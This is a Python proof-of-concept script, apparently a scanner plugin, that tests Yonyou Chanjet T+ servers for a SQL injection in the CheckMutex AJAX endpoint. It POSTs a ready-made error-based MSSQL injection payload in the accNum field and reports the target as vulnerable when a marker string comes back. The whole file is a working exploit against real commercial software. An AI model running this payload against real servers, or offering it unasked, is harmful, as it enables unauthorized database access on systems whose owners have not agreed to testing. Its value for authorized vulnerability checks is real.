import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友畅捷通-TPlus-CheckMutex存在sql注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0'
    }
    data = '''{"accNum": "3' AND 5227 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (5227=5227) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(120)+CHAR(113)))-- NCab", "functionTag": "SYS0104", "url": ""}'''
    vurl = urllib.parse.urljoin(url, "/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'qvpxq' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult